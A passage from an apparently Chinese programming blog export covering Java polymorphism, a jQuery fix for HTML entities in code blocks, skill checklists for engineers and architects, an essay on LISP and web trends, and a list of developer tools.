<p>为什么一个对象要变成另外的类型的对象呢？因为java是一门强制类型的语言，函数传递的参数是有指定类型的。那么怎样让一个函数处理不同类型的对象呢？这就是多态的作用，让一个对象可以变形态，并且可以保证调用正确的方法。</p>
<p>原则：</p>
<p>*类只能转换成其父类或其本身和其父类实现的接口。能用接口不用类。</p>
<p>*方法总执行覆盖链上的最后一个方法。</p>
<p>*对象可调用的属性只限于继承链中对象当前处于的类型和上游类型的接口中的属性，上游方法可顺覆盖链回溯到覆盖链终端执行最终方法。</p>
<p>应用：</p>
<p>假设函数的传入是通过一个通道完成的，只有和通道形状相同的对象（类型相同）才可传入，那么要想将一个形态不同的对象传入这个函数就要强制改变其形状，并且调用的方法还要正确有，这时就用多态了。</p>
<p>在同一段程序中将一个对象的类型强制变来变去，在java中是没有意义的。</p>
<p>例子：</p>
<p>所有的鸟都有翅膀，都要有飞的动作，在所有鸟类都实现的接口中应有一个fly()方法，所以在各种鸟的类中必有一个fly()的具体实现。</p>
<p>现做一个函数可以让所有的鸟实例做飞的动作，那么参数设置什么类型呢？应该设置为所有鸟的实例都可转换到的一类型（形态）――定义了fly()方法的那个接口。</p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>如何解决编辑器中HTML实体自动替换问题</title>
    <url>/blog/webtech/edithtmlentity/</url>
    <content><![CDATA[<p>在网页中显示html代码或xml代码要将&quot;&lt;&quot;替换成”&lt;&quot;，否则会当标签解析。</p>
<p>但在用编辑器编辑内容时，第一次可以正确保存，但以后都会自动把”&lt;&quot;自动替换成&quot;&lt;&quot;，导致第二次保存内容不正确。</p>
<p>对于显示xml和html源码的网页特别明显，对于c&#x2F;c++的include也有影响。</p>
<p>造成这种问题的根本原因和编辑器没关系，编辑器在加载”&lt;&quot;时浏览器会将其翻译成&quot;&lt;&quot;，就是只用textarea也没用，再次保存时提交的数据已经是&quot;&lt;&quot;了。</p>
<p>所以对于想将数据内容保存成”&lt;&quot;是没有好办法的。</p>
<p>这里的处理方法是在浏览器端将pre标签里的&quot;&lt;&quot;替换成”&lt;&quot;，数据库里保存的还是&quot;&lt;&quot;，一切都简单了。</p>
<pre><code>    $(document).ready(function() &#123;
      $(&#39;pre&#39;).each(function(i, block) &#123;
        var tmp=$(&quot;code&quot;,block);
        if(!tmp.length) tmp=$(block);
        tmp.html(tmp.html().replace(new RegExp(&quot;&lt;&quot;, &quot;g&quot;), &#39;&lt;&#39;));
        hljs.highlightBlock(block);
      &#125;);
    &#125;);
</code></pre>
<p>这段代码的思路是遍历pre标签，替换其中的&quot;&lt;&quot;为”&lt;&quot;，有的pre内容还用code括了一层，也处理了一下。</p>
<p>最后hljs.highlightBlock(block);是代码格式化插件的调用，一切都完美了。</p>
]]></content>
  </entry>
  <entry>
    <title>高级软件工程师基本技能</title>
    <url>/blog/pytx/gjrjgcs/</url>
    <content><![CDATA[<h2 id="通用部分"><a href="#通用部分" class="headerlink" title="通用部分"></a>通用部分</h2><h3 id="语言高级"><a href="#语言高级" class="headerlink" title="语言高级"></a>语言高级</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>1、熟悉语言的高级功能包的功能特性，包括安全、网络、多线程等，以及扩展的语言包。</p>
<p>2、能够运用高级功能包进行业务系统的开发、测试工作。</p>
<p><strong>java高级</strong></p>
<p>1、熟悉目前比较主流的Java开源模块，如日志、XML处理、池管理器等，并能运用到业务系统的开发中，同时能够进行相关问题的解决。</p>
<p>2、掌握JVM相关知识，了解Java语言的设计原理，具有基本的调优排查问题的能力。</p>
<p>3、通过SCJP认证</p>
<h3 id="数据库高级"><a href="#数据库高级" class="headerlink" title="数据库高级"></a>数据库高级</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>学习最好的方式就是参加大量大型项目的设计工作。</p>
<p>索引应用：</p>
<ul>
<li>索引何时生效</li>
<li>索引类型</li>
<li>如何强制使用索引</li>
<li>如何判断是否使用索引</li>
<li>使用索引时的注意事项</li>
</ul>
<p>数据库设计：</p>
<ul>
<li>考虑目前的生产环境；</li>
<li>考虑旧数据兼容性；</li>
<li>定义标准的对象命名规范；</li>
<li>遵守3范式；</li>
<li>高级冗余，适当的引入冗余设计，提高性能、降低业务实现难度；</li>
<li>避免使用触发器，文档化管理；</li>
<li>主键的生成方式；</li>
<li>物理存储、逻辑存储规划；</li>
<li>基本索引；</li>
<li>数据库服务基本参数设定；</li>
<li>实体关系设计</li>
</ul>
<p>数据库调优：</p>
<p>索引、分割数据、产品参数调整、避免热数据、缓存</p>
<h3 id="高级设计模式"><a href="#高级设计模式" class="headerlink" title="高级设计模式"></a>高级设计模式</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>掌据至少15个设计模式，能阐述各自的特点和应用场景。</p>
<p>在系统架构设计中，能够应用设计模式。</p>
<p>最好的学习方式就是看开源项目的实现方式。</p>
<h3 id="专题技术"><a href="#专题技术" class="headerlink" title="专题技术"></a>专题技术</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>学习通用专题技术，扩展业务相关专题技术。</p>
<h2 id="WEB方向"><a href="#WEB方向" class="headerlink" title="WEB方向"></a>WEB方向</h2><h3 id="集群技术"><a href="#集群技术" class="headerlink" title="集群技术"></a>集群技术</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>了解集群的原理，掌握中间件集群时需要注意的问题（负载均衡、Session同步等），至少掌握一个中间件的集群配置达到熟练程度。</p>
<h2 id="JAVA-WEB方向"><a href="#JAVA-WEB方向" class="headerlink" title="JAVA WEB方向"></a>JAVA WEB方向</h2><h3 id="Spring-x2F-Struts-x2F-Hibernate高级"><a href="#Spring-x2F-Struts-x2F-Hibernate高级" class="headerlink" title="Spring&#x2F;Struts&#x2F;Hibernate高级"></a>Spring&#x2F;Struts&#x2F;Hibernate高级</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：JAVA WEB开发</li>
</ul>
<p>1、对主流框架的功能、体系结构有比较深入的了解；能够对框架使用中的疑难问题进行分析、解决。</p>
<p>2、对SSH有较深入的研究，了解SSH的架构设计，了解SSH的一些特性的实现原理(如Spring的AOP、IoC,Struts的MVC，Hibernate中的Dialect等）</p>
<p>3、在系统设计时能够借鉴SSH的设计思想。</p>
]]></content>
      <categories>
        <category>知识体系</category>
      </categories>
      <tags>
        <tag>知识体系</tag>
      </tags>
  </entry>
  <entry>
    <title>（资深）架构师基本技能</title>
    <url>/blog/pytx/jgs/</url>
    <content><![CDATA[<h2 id="通用部分"><a href="#通用部分" class="headerlink" title="通用部分"></a>通用部分</h2><h3 id="安全设计"><a href="#安全设计" class="headerlink" title="安全设计"></a>安全设计</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>系统安全性设计原则，了解至少三点，要求至少有一项设计实践：</p>
<p>1、保护最薄弱环节(系统最薄弱部分就是最易受攻击影响的部分)；</p>
<p>2、纵深防御(采取一系列防御，以便在一层防御不能抓住错误时，另一层防御将可能抓住它。)；</p>
<p>3、故障保护；</p>
<p>4、最小特权(只授予执行操作所必需的最少访问权，并且对于该访问权只准许使用所需的最少时间)；</p>
<p>5、分隔原则(将系统分成尽可能多的独立单元，可以将对系统可能造成损害的量降到最低。)。</p>
<h3 id="性能设计"><a href="#性能设计" class="headerlink" title="性能设计"></a>性能设计</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>解决性能应该从哪些方面入手，了解4点，并能列举具体的优化技术，要求至少应用过其中的两种方法：</p>
<p>1、缓存及缓存层；</p>
<p>2、采用多线程；</p>
<p>3、实施负载平衡；</p>
<p>4、对数据库进行优化；</p>
<p>5、文件系统优化；</p>
<p>6、代码性能优化；</p>
<p>7、应用层功能改造（分页、运算分离、惰性加载）</p>
<h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>1、至少实现过一项较为复杂的算法设计（要求有文档）；</p>
<p>2、掌握至少两项常见的但有一定复杂度的计算机算法原理，如Hash算法、快速排序、DES算法、MD5算法等等。</p>
<h3 id="架构设计"><a href="#架构设计" class="headerlink" title="架构设计"></a>架构设计</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>1、掌握基本的架构设计理论：了解“4+1视图”模型（能列述），了解常见架构视力类型（要能按照“消费者、视角、元素、关系”四要素对具体架构视图进行说明）；</p>
<p>2、掌握架构的分层观点（三层设计）；</p>
<p>3、安全设计、性能设计、算法设计中具备2项；</p>
<p>4、了解架构师的职责(a、理解系统的业务需求，制定系统的整体框架（包括：技术框架和业务框架）<br>b、对系统框架相关技术和业务进行培训，指导开发人员开发。并解决系统开发、运行中出现的各种问题。)；\</p>
<p><a href="/arch/view/" title="架构设计之4+1视图">架构设计之4+1视图</a></p>
<p><a href="/arch/lb/" title="负载均衡学习笔记">负载均衡学习笔记</a></p>
]]></content>
      <categories>
        <category>知识体系</category>
      </categories>
      <tags>
        <tag>知识体系</tag>
      </tags>
  </entry>
  <entry>
    <title>技术的囚笼</title>
    <url>/blog/pytx/jsdql/</url>
    <content><![CDATA[<h2 id="技术的囚笼"><a href="#技术的囚笼" class="headerlink" title="技术的囚笼"></a>技术的囚笼</h2><p>公司和个人会因为已经熟悉了某种技术而对有替代性的更先进技术有抗拒心理，当转换成本越大时这种倾向越明显。</p>
<p>天下大势，浩浩汤汤，顺之者昌，逆之者亡。</p>
<p>我写这篇文章只表述个人对未来技术的一些看法，可能会戳中某些人的痛点，你可以想想自己有没有被学过的技术困住。</p>
<h2 id="MVC还是那个MVC吗？"><a href="#MVC还是那个MVC吗？" class="headerlink" title="MVC还是那个MVC吗？"></a>MVC还是那个MVC吗？</h2><p>MVC是个老话题，百说不厌。过去的MVC就不说了，我想说说新趋势。</p>
<p>我们看到网页内容可以分为三个阶段，数据获取、数据装载、数据渲染。</p>
<p>这个过程已经发生了翻天覆地的变化。过去网页在服务器上生成，服务器返回一个网页，浏览器再把网页渲染成我们看到的内容。</p>
<p>现在服务器已经不再生成网页了，更倾向于提供数据接口，只保留了数据获取阶段，其它两个阶段都放浏览器端做了。</p>
<p>过程是这样的，加载的页面会加载js组件，js组件会从服务器接口获取数据，装载数据，渲染现在已经不止浏览器对HTML渲染了，还可以把数据渲染到canvas上，可以看一下百度的echarts，也可以看一些webgl的例子。</p>
<p>这样有很多好处。</p>
<p>服务器端技术已经不受具体限制了，只要接口返回指定格式的数据就行。所以可以用各种语言和框架编程，不用担心技术过时或受技术交替的冲击。</p>
<p>前端的显示也可以赶上多变的技术，更炫的效果还是要用canvas做渲染。webgl的和种框架可以做出很炫的3D动画，所以想像已经不受技术的限制了。有了新渲染框架和数据对接一下就OK了。</p>
<p>将来的前端会桌面化，加载一次，以后交互都只是数据更新。话说已经有好多这种例子了。</p>
<p>所以最先死的是各种P：jsp、php、asp等，还有各种基于P的标签组件技术。</p>
<h2 id="语言的大一统"><a href="#语言的大一统" class="headerlink" title="语言的大一统"></a>语言的大一统</h2><p>语言有两个端，C和LISP。</p>
<p>我是用JAVA的，JAVA好不好用？真心的不好用，当然和C++比还是有优势的。但用JAVA的地方太多了，所以一时也死不了。</p>
<p>将来的语言会怎么发展？</p>
<p>我觉得各种语言会死掉，但各种语言的虚拟机还会活很长时间。因为在各种虚拟机上会出现很多LISP方言，可以复用现有的库。但这已经不是原来的语言了，一个语言最重要的是语言的语法，语法都不一样了，就不能算一种语言了。</p>
<p>漫长的混乱之后，可能各种虚拟机也都消失了。LISP方言也有了统一的标准。这时我们发现我们在用一种20世纪60年代的编程语言，多么的可笑。</p>
<h2 id="LISP不是一种语言"><a href="#LISP不是一种语言" class="headerlink" title="LISP不是一种语言"></a>LISP不是一种语言</h2><p>LISP语言并不是一种语言，而是一种语法。列表形式的语法可以做到代码即数据，数据即代码。从而实现LISP的宏功能，让每个人都可以定义自己的语言。</p>
<p>用列表做语法的都可以认为是LISP方言，实现了LISP宏的都可以认为是完备的LISP方言。</p>
<p>自己的才是最好的，这一点对开发人员体现优为重要。</p>
<p>LISP语法实在太简单了，有点编程基础的人都可以写一个简单的LISP解析器。</p>
<p>LISP成为大一统的原因很简单：至简则至快，至快则至强，至强则无敌。</p>
<p>“天下武功无坚不破,唯快不破”，这在IT领域也是至理名言。以至于《黑客与画家》的作者把LISP当作他创业成功的秘密武器。</p>
<p>其实这很好理解：</p>
<p>同样的时间做更多的事意味着成本低。</p>
<p>更短的时间做更多的事意味着对手不可能超过你。</p>
<p>快意味着：更便宜、客户更满意、对手有你就有、你有对手没有的。这就是技术壁垒。</p>
<p>ASM、C、LISP，我们画了一个圈，又回到了原点。最终还是这三个古老的语言取得了胜利。</p>
]]></content>
  </entry>
  <entry>
    <title>计算机科学技术基础知识</title>
    <url>/blog/pytx/jsjjczs/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>了解什么是计算机，计算机是怎么运行的，操作系统是怎么回事。</p>
<h3 id="计算机导论"><a href="#计算机导论" class="headerlink" title="计算机导论"></a>计算机导论</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<h3 id="计算机组成与结构"><a href="#计算机组成与结构" class="headerlink" title="计算机组成与结构"></a>计算机组成与结构</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<h3 id="计算机操作系统原理"><a href="#计算机操作系统原理" class="headerlink" title="计算机操作系统原理"></a>计算机操作系统原理</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<h2 id="编程基础知识"><a href="#编程基础知识" class="headerlink" title="编程基础知识"></a>编程基础知识</h2><h3 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>不求深入，重在理解，帮助理解计算机结构和运动相关知识。黑客必精的技术。嵌入式可能会用到。一般开发用不到。</p>
<h3 id="C语言与程序设计"><a href="#C语言与程序设计" class="headerlink" title="C语言与程序设计"></a>C语言与程序设计</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>至少要掌握会用，达到更深入的程度更好。系统开发、嵌入式开发必精语言。</p>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>深入挖掘，反复温习，这是软件开发与写程序的基础。</p>
<h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>理解编译原理是什么，这是很难学习的知识，但理解深入对编程有莫大好处。</p>
<h3 id="JAVA程序设计"><a href="#JAVA程序设计" class="headerlink" title="JAVA程序设计"></a>JAVA程序设计</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>理解面向对象编程思想，掌握JAVA语言的特点。</p>
<h3 id="数据库原理"><a href="#数据库原理" class="headerlink" title="数据库原理"></a>数据库原理</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>数据库原理不是讲怎么写SQL，而是讲数据库是怎么实现的，是做数据库设计、开发、调优的基础。反复温习，深入理解。</p>
<h3 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>重在理解网络是怎么实现和通信的。是很多开发方向的基础。反复温习，深入理解。</p>
]]></content>
      <categories>
        <category>知识体系</category>
      </categories>
      <tags>
        <tag>知识体系</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程师基本技能</title>
    <url>/blog/pytx/rjgcs/</url>
    <content><![CDATA[<h2 id="通用部分"><a href="#通用部分" class="headerlink" title="通用部分"></a>通用部分</h2><h3 id="语言中级"><a href="#语言中级" class="headerlink" title="语言中级"></a>语言中级</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>熟练使用编程语言。熟练使用常用的类或库，熟悉IO处理、异常处理、文本时间处理、XML&#x2F;JSON处理、数据库操作、网编编程等常用功能。</p>
<h3 id="数据库中级"><a href="#数据库中级" class="headerlink" title="数据库中级"></a>数据库中级</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>掌握一种或多种数据库。精通SQL语言，能完成各种查询和统计功能。</p>
<h3 id="类设计"><a href="#类设计" class="headerlink" title="类设计"></a>类设计</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>按照提供的需求，进行类设计,要求满足以下要求：</p>
<p>1、能够体现出面向对象编程的特点：封装、继承、重载、多态；</p>
<p>2、能够体现出面向对象编程的基本原则：开-闭原则、替换原则、依赖原则、接口分离原则；</p>
<p>3、能反应出部分设计模式的应用，但不一定要求能解释清楚设计模式定义。</p>
<h3 id="基础设计模式"><a href="#基础设计模式" class="headerlink" title="基础设计模式"></a>基础设计模式</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>了解设计模式的基本分类，能列表至少5个常用设计模式，并能阐述各自的特点和应用场景。</p>
<p>除单例模式外，至少在编码使用过两个别的设计模式。增强代码的可扩展、可维护性。</p>
<h3 id="专题技术"><a href="#专题技术" class="headerlink" title="专题技术"></a>专题技术</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★</li>
<li>适合人员：所有</li>
</ul>
<p>学习通用专题技术，扩展业务相关专题技术。</p>
<h2 id="WEB方向基础"><a href="#WEB方向基础" class="headerlink" title="WEB方向基础"></a>WEB方向基础</h2><h3 id="HTML-amp-CSS高级"><a href="#HTML-amp-CSS高级" class="headerlink" title="HTML&amp;CSS高级"></a>HTML&amp;CSS高级</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<p>可以熟练快速的搭建各种界面结构，实现各种界面效果。</p>
<h3 id="JavaScript高级"><a href="#JavaScript高级" class="headerlink" title="JavaScript高级"></a>JavaScript高级</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：WEB开发</li>
</ul>
<p>深入理解JavaScript语言特性。</p>
<h2 id="JAVA-WEB方向"><a href="#JAVA-WEB方向" class="headerlink" title="JAVA WEB方向"></a>JAVA WEB方向</h2><p>[开始学习JAVA WEB技术]</p>
<h3 id="Tomcat调优"><a href="#Tomcat调优" class="headerlink" title="Tomcat调优"></a>Tomcat调优</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★</li>
<li>适合人员：JAVA WEB开发</li>
</ul>
<p>深入了解产品的体系结构、熟悉常见问题的解决办法，能够进行疑难问题解决，以及性功能调优工作</p>
<h3 id="Spring-x2F-Struts-x2F-Hibernate基础"><a href="#Spring-x2F-Struts-x2F-Hibernate基础" class="headerlink" title="Spring&#x2F;Struts&#x2F;Hibernate基础"></a>Spring&#x2F;Struts&#x2F;Hibernate基础</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：JAVA WEB开发</li>
</ul>
<p>1、对主流框架的功能有比较全面的了解，能够使用框架进行业务系统的开发，了解常见的业务开发中的问题</p>
<p>2、能够熟练配置地单独或是组合使用SSH，说明基于SSH开发的配置方法和实现步骤。（说明applicationContext.xml、web.xml、hibernate.cfg.xml的配置方法）</p>
]]></content>
  </entry>
  <entry>
    <title>开发人员基本工具介绍</title>
    <url>/blog/pytx/tools/</url>
    <content><![CDATA[<p><a href="http://pan.baidu.com/pcloud/album/info?uk=521333629&album_id=1948267972832179076">百度网盘下载</a></p>
<h2 id="集成开发环境IDE"><a href="#集成开发环境IDE" class="headerlink" title="集成开发环境IDE"></a>集成开发环境IDE</h2><p>集成开发环境(IDE，Integrated Development Environment)是用于提供程序开发环境的应用程序，一般包括代码编辑器、编译器、调试器和图形用户界面工具。</p>
<h3 id="Eclipse-开源"><a href="#Eclipse-开源" class="headerlink" title="Eclipse(开源)"></a>Eclipse(开源)</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>Eclipse 是一个开放源代码的、基于Java的可扩展开发平台。常用的有下面几种：</p>
<ul>
<li>Eclipse IDE for Java Developers</li>
<li>Eclipse IDE for C&#x2F;C++ Developers</li>
<li>Eclipse IDE for Java EE Developers</li>
<li>Eclipse for PHP Developers</li>
</ul>
<p>MyEclipse(收费)，是在eclipse基础上加上自己的插件开发而成的功能强大的企业级集成开发环境，主要用于Java、JavaEE以及移动应用的开发。</p>
<p><a href="http://jingyan.baidu.com/article/c275f6bad5cc3fe33d75673e.html">【Eclipse】：[1]如何配制统一的代码模板</a></p>
<p><a href="http://jingyan.baidu.com/article/9f7e7ec05dd8d06f28155429.html">【Eclipse】：[2]如何配制项目编译JDK版本</a></p>
<p><a href="http://jingyan.baidu.com/article/ed2a5d1f4aa2ce09f6be17d5.html">【Eclipse】：[3]怎么设置条件断点</a></p>
<p><a href="http://jingyan.baidu.com/article/59703552e978fe8fc00740c1.html">【Eclipse】：[4]如何使用工作集管理项目</a></p>
<p><a href="http://jingyan.baidu.com/article/af9f5a2d37412c43140a45eb.html">【Eclipse】：[5]Tomcat内存溢出解决方法</a></p>
<h3 id="NetBeans-开源"><a href="#NetBeans-开源" class="headerlink" title="NetBeans(开源)"></a>NetBeans(开源)</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>NetBeans是开源软件开发集成环境，是一个开放框架，可扩展的开发平台，可以用于Java、C&#x2F;C++，PHP等语言的开发，本身是一个开发平台，可以通过扩展插件来扩展功能。</p>
<h3 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：Winodws开发人员</li>
</ul>
<p>Visual Studio是目前最流行的Windows平台应用程序的集成开发环境。</p>
<h2 id="代码编辑器"><a href="#代码编辑器" class="headerlink" title="代码编辑器"></a>代码编辑器</h2><h3 id="Notepad-开源"><a href="#Notepad-开源" class="headerlink" title="Notepad++(开源)"></a>Notepad++(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★</li>
<li>适合人员：所有</li>
</ul>
<p>Notepad++ 是一款Windows环境下免费开源的代码编辑器，支持的语言有C, C++,Java, C#, XML, HTML, PHP, Javascript等。</p>
<p>插件介绍：</p>
<p>Emmet：HTML&#x2F;CSS代码快速编写神器，前身是大名鼎鼎的Zencoding。它使用仿CSS选择器的语法来生成代码，大大提高了HTML&#x2F;CSS代码编写的速度。</p>
<p>Poor Man’s T-SQL Formatter：格式化sql的插件。</p>
<p><a href="http://jingyan.baidu.com/article/3ea51489fc75a452e61bba9b.html">【Notepad++】：[1]怎么安装插件</a></p>
<p><a href="http://jingyan.baidu.com/article/a17d528504a6f78099c8f27f.html">【Notepad++】：[2]怎么美化sql排版</a></p>
<h3 id="UltraEdit"><a href="#UltraEdit" class="headerlink" title="UltraEdit"></a>UltraEdit</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>UltraEdit 是一套功能强大的文本编辑器，可以编辑文本、十六进制、ASCII码。可以用其来修改EXE 或 DLL 文件。可以对JAVA，PERL，HTML，XML，C#，C&#x2F;C++，visual basic 等进行很好的语法着色。</p>
<p><a href="http://jingyan.baidu.com/article/9f63fb91a7afa5c8400f0ec3.html">【UltraEdit】：[1]如何使用列模式</a></p>
<h3 id="VIM-开源"><a href="#VIM-开源" class="headerlink" title="VIM(开源)"></a>VIM(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：类Unix系统用户</li>
</ul>
<p>Vim是从 vi发展出来的一个文本编辑器。代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。vim设计之初就是整个文本编辑都用键盘而非鼠标来完成，vim有过百条命令对应编辑的需要，如果能熟练使用vim这些命令，编辑速度确实比鼠标要快很多，但是想全都记住它们也是一件难事</p>
<h3 id="Emacs-开源"><a href="#Emacs-开源" class="headerlink" title="Emacs(开源)"></a>Emacs(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★★★★</li>
<li>适合人员：类Unix系统用户</li>
</ul>
<p>Emacs不仅仅是一个编辑器，他是一个整合环境，或可称它为集成开发环境，这些功能如让使用者置身于全功能的操作系统中，在基于编辑器的功能基础上，Emacs自行开发了一个“bourne-shell-like”的shell: EShell。</p>
<h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><h3 id="Subversion-开源"><a href="#Subversion-开源" class="headerlink" title="Subversion(开源)"></a>Subversion(开源)</h3><ul>
<li>重要程度：★★★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>Subversion(简称svn)是一个自由，开源的版本控制系统。是近年来崛起的版本管理软件系统，是cvs的接班人。目前，绝大多数开源软件都使用svn作为代码版本管理软件。</p>
<h3 id="TortoiseSVN-开源"><a href="#TortoiseSVN-开源" class="headerlink" title="TortoiseSVN(开源)"></a>TortoiseSVN(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>TortoiseSVN 是 Subversion版本控制系统的一个免费开源客户端，可以超越时间的管理文件和目录。</p>
<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><h3 id="FileZilla-Client-开源"><a href="#FileZilla-Client-开源" class="headerlink" title="FileZilla Client(开源)"></a>FileZilla Client(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★</li>
<li>适合人员：所有</li>
</ul>
<p>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。Filezilla客户端是一个方便高效的FTP客户端工具。</p>
<p><a href="http://jingyan.baidu.com/article/4b07be3c69e62648b380f3f4.html">最好的开源FTP FileZilla使用介绍</a></p>
<h3 id="FileZilla-Server-开源"><a href="#FileZilla-Server-开源" class="headerlink" title="FileZilla Server(开源)"></a>FileZilla Server(开源)</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。FileZilla<br>Server是一个小巧并且可靠的支持FTP&amp;SFTP的FTP服务器软件。</p>
<h3 id="Serv-U-FTP-Server"><a href="#Serv-U-FTP-Server" class="headerlink" title="Serv-U FTP Server"></a>Serv-U FTP Server</h3><p>重要程度：★★★<br>学习难易：★★<br>适合人员：所有</p>
<p>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x&#x2F;9x&#x2F;ME&#x2F;NT&#x2F;2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等，功能非常完备。它具有非常完备的安全特性，支持SSlFTP传输，支持在多个Serv-U和FTP客户端通过SSL加密连接保护您的数据安全等。</p>
<p><a href="http://jingyan.baidu.com/article/4f7d5712b11a7c1a21192710.html">怎么用Serv-U搭建FTP服务器</a></p>
<h2 id="数据库管理工具"><a href="#数据库管理工具" class="headerlink" title="数据库管理工具"></a>数据库管理工具</h2><h3 id="PLSQL-Developer"><a href="#PLSQL-Developer" class="headerlink" title="PLSQL Developer"></a>PLSQL Developer</h3><ul>
<li>重要程度：★★</li>
<li>学习难易：★★★</li>
<li>适合人员：所有</li>
</ul>
<p>PL&#x2F;SQL Developer是一个集成开发环境，专门面向Oracle数据库存储程序单元的开发。如今，有越来越多的商业逻辑和应用逻辑转向了Oracle Server，因此，PL&#x2F;SQL编程也成了整个开发过程的一个重要组成部分。</p>
<p><a href="http://jingyan.baidu.com/article/020278119f89f11bcc9ce52e.html">【PLSQL】：[1]如何远程连接多个ORACLE数据库</a></p>
<h3 id="Navicat"><a href="#Navicat" class="headerlink" title="Navicat"></a>Navicat</h3><ul>
<li>重要程度：★★★</li>
<li>学习难易：★★</li>
<li>适合人员：所有</li>
</ul>
<p>Navicat适用于三种平台 - Microsoft Windows、Mac OS X及Linux。它可以让用户连接到任何本机或远程服务器、提供一些实用的数据库工具如数据模型、数据传输、数据同步、结构同步、导入、导出、备份、还原、报表创建工具及计划以协助管理数据。</p>
<p>支持MySQL、SQL Server、SQLite、Oracle 及 PostgreSQL数据库进行管理及开发。</p>
<p><a href="http://jingyan.baidu.com/article/48206aeaf4ac33216ad6b3f9.html">【Navicat】：[1]怎么创建数据库连接</a></p>
